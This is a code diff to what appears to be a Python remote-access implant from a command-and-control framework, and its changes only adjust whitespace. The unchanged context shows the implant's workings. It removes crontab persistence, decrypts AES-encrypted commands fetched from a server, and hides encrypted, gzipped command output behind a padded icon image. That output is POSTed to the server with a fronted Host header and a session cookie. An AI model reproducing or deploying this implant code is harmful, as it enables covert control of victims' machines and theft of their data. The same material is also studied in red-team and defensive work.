@@ -78,10 +78,10 @@ def remove_persist():
   s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
   return "Removed user persistence via crontab: \\r\\n**must delete files manually**"
 
-def decrypt_bytes_gzip( key, data):
+def decrypt_bytes_gzip(key, data):
   iv = data[0:16]
   aes = get_encryption(key, iv)
-  data =  aes.decrypt( data )
+  data =  aes.decrypt(data)
   import StringIO
   import gzip
   infile = StringIO.StringIO(data[16:])
@@ -108,7 +108,7 @@ while(True):
     #print html
     if html:
       try:
-        returncmd = decrypt( key, html )
+        returncmd = decrypt(key, html)
         returncmd = returncmd.rstrip('\\0')
   
         if "multicmd" in returncmd:
@@ -213,7 +213,7 @@ while(True):
             opener = urllib2.build_opener()
             postcookie = encrypt(key, taskId)
             data = base64.b64decode(random.choice(icoimage))
-            dataimage = data.ljust( 1500, '\x00' )
+            dataimage = data.ljust(1500, '\x00')
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
             if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
